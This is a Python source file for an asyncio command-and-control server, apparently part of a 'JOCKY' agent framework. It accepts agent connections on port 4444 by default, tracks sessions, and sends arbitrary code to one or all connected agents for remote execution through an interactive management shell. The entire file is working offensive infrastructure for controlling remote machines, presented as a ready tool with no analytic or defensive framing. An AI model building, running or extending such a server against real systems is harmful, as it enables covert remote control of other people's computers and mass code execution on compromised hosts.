"""
JOCKY C2 Server — asyncio-based command-and-control server that manages
multiple simultaneous agent connections and dispatches JOCKY script execution.
"""
from __future__ import annotations
import asyncio
import json
import os
import sys
import time
import uuid
from typing import Optional

# ── Protocol constants ────────────────────────────────────────────────────────

MSG_HELLO   = "HELLO"
MSG_CMD     = "CMD"
MSG_RESULT  = "RESULT"
MSG_PING    = "PING"
MSG_PONG    = "PONG"
MSG_BYE     = "BYE"

PROTOCOL_VERSION = "1"
FRAME_SEP = b"\n"
MAX_FRAME  = 64 * 1024 * 1024  # 64 MB

# ── Agent session ─────────────────────────────────────────────────────────────

class AgentSession:
    def __init__(
        self,
        sid: str,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        self.sid     = sid
        self.reader  = reader
        self.writer  = writer
        self.info:  dict = {}
        self.connected_at = time.time()
        self.last_seen    = time.time()
        self._pending: dict[str, asyncio.Future] = {}

    @property
    def addr(self) -> str:
        try:
            return f"{self.writer.get_extra_info('peername')}"
        except Exception:
            return "unknown"

    async def send(self, msg: dict) -> None:
        data = json.dumps(msg).encode() + FRAME_SEP
        self.writer.write(data)
        await self.writer.drain()

    async def recv(self) -> Optional[dict]:
        try:
            line = await asyncio.wait_for(self.reader.readline(), timeout=60.0)
            if not line:
                return None
            return json.loads(line.decode())
        except (asyncio.TimeoutError, json.JSONDecodeError):
            return None

    async def exec_script(self, script_path: str, timeout: float = 120.0) -> dict:
        """Send a CMD to the agent, wait for RESULT. Returns result dict."""
        cmd_id = str(uuid.uuid4())
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending[cmd_id] = fut
        await self.send({
            "type":    MSG_CMD,
            "cmd_id":  cmd_id,
            "action":  "exec_script",
            "script":  script_path,
        })
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        except asyncio.TimeoutError:
            self._pending.pop(cmd_id, None)
            return {"status": "timeout", "cmd_id": cmd_id}

    async def exec_code(self, code: str, timeout: float = 120.0) -> dict:
        """Send JOCKY source code directly for execution on the agent."""
        cmd_id = str(uuid.uuid4())
        fut: asyncio.Future = asyncio.get_event_loop().create_future()
        self._pending[cmd_id] = fut
        await self.send({
            "type":    MSG_CMD,
            "cmd_id":  cmd_id,
            "action":  "exec_code",
            "code":    code,
        })
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        except asyncio.TimeoutError:
            self._pending.pop(cmd_id, None)
            return {"status": "timeout", "cmd_id": cmd_id}

    def deliver_result(self, msg: dict) -> None:
        cmd_id = msg.get("cmd_id", "")
        fut    = self._pending.pop(cmd_id, None)
        if fut and not fut.done():
            fut.set_result(msg)

# ── C2 Server ─────────────────────────────────────────────────────────────────

class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 4444, tls: bool = False) -> None:
        self.host    = host
        self.port    = port
        self.tls     = tls
        self._agents: dict[str, AgentSession] = {}
        self._server: Optional[asyncio.AbstractServer] = None

    # ── Connection handler ────────────────────────────────────────────────────

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        sid = str(uuid.uuid4())[:8]
        session = AgentSession(sid, reader, writer)
        print(f"[C2] New connection from {session.addr} — SID {sid}")

        try:
            # Expect HELLO
            hello = await session.recv()
            if not hello or hello.get("type") != MSG_HELLO:
                await session.send({"type": "ERR", "msg": "expected HELLO"})
                return

            session.info = hello.get("info", {})
            self._agents[sid] = session
            print(f"[C2] Agent {sid} registered: {session.info}")
            await session.send({"type": MSG_HELLO, "sid": sid, "version": PROTOCOL_VERSION})
            self._on_agent_connect(session)

            # Message loop
            while True:
                msg = await session.recv()
                if msg is None:
                    break
                session.last_seen = time.time()
                mtype = msg.get("type", "")

                if mtype == MSG_PING:
                    await session.send({"type": MSG_PONG})
                elif mtype == MSG_RESULT:
                    session.deliver_result(msg)
                elif mtype == MSG_BYE:
                    break
                else:
                    print(f"[C2] Unknown message type from {sid}: {mtype}")

        except Exception as e:
            print(f"[C2] Error with agent {sid}: {e}")
        finally:
            self._agents.pop(sid, None)
            try:
                writer.close()
            except Exception:
                pass
            print(f"[C2] Agent {sid} disconnected")
            self._on_agent_disconnect(sid)

    # ── Event hooks (override in subclass) ───────────────────────────────────

    def _on_agent_connect(self, session: AgentSession) -> None:
        pass

    def _on_agent_disconnect(self, sid: str) -> None:
        pass

    # ── Management API ────────────────────────────────────────────────────────

    def list_agents(self) -> list[dict]:
        now = time.time()
        return [
            {
                "sid":           sid,
                "addr":          s.addr,
                "info":          s.info,
                "connected_secs": int(now - s.connected_at),
                "idle_secs":     int(now - s.last_seen),
            }
            for sid, s in self._agents.items()
        ]

    def get_agent(self, sid: str) -> Optional[AgentSession]:
        return self._agents.get(sid)

    async def exec_all(self, code: str) -> dict[str, dict]:
        """Broadcast JOCKY code execution to all connected agents."""
        tasks = {sid: session.exec_code(code) for sid, session in list(self._agents.items())}
        results = await asyncio.gather(*tasks.values(), return_exceptions=True)
        return {sid: (r if not isinstance(r, Exception) else {"status": "error", "msg": str(r)})
                for sid, r in zip(tasks.keys(), results)}

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    async def start(self) -> None:
        ssl_ctx = None
        if self.tls:
            import ssl
            ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            cert = os.path.join(os.path.dirname(__file__), "server.crt")
            key  = os.path.join(os.path.dirname(__file__), "server.key")
            if os.path.exists(cert) and os.path.exists(key):
                ssl_ctx.load_cert_chain(cert, key)
            else:
                print("[C2] TLS cert not found — falling back to plaintext")
                ssl_ctx = None

        self._server = await asyncio.start_server(
            self._handle_client, self.host, self.port, ssl=ssl_ctx,
        )
        proto = "TLS" if (ssl_ctx and self.tls) else "TCP"
        print(f"[C2] Listening on {self.host}:{self.port} ({proto})")

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            await self._server.wait_closed()

    async def run_forever(self) -> None:
        await self.start()
        async with self._server:
            await self._server.serve_forever()

    # ── Interactive CLI for management ────────────────────────────────────────

    async def interactive_loop(self) -> None:
        """Simple interactive management shell running alongside the server."""
        loop = asyncio.get_event_loop()
        print("[C2] Management shell ready. Commands: list, exec <sid> <code>, execall <code>, quit")
        while True:
            try:
                raw = await loop.run_in_executor(None, input, "C2> ")
            except (EOFError, KeyboardInterrupt):
                break
            raw = raw.strip()
            if not raw:
                continue
            parts = raw.split(None, 2)
            cmd   = parts[0].lower()

            if cmd == "list":
                agents = self.list_agents()
                if not agents:
                    print("  (no agents)")
                for a in agents:
                    print(f"  [{a['sid']}] {a['addr']} — connected {a['connected_secs']}s, idle {a['idle_secs']}s | {a['info']}")

            elif cmd == "exec" and len(parts) >= 3:
                sid, code = parts[1], parts[2]
                session = self.get_agent(sid)
                if not session:
                    print(f"  Agent {sid} not found")
                    continue
                result = await session.exec_code(code)
                print(f"  Result: {json.dumps(result, indent=2)}")

            elif cmd == "execall" and len(parts) >= 2:
                code = parts[1] if len(parts) == 2 else " ".join(parts[1:])
                results = await self.exec_all(code)
                for sid, r in results.items():
                    print(f"  [{sid}]: {json.dumps(r)}")

            elif cmd == "quit":
                await self.stop()
                break


async def _main(host: str = "0.0.0.0", port: int = 4444) -> None:
    server = C2Server(host, port)
    await server.start()
    await server.interactive_loop()


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    asyncio.run(_main(host, port))
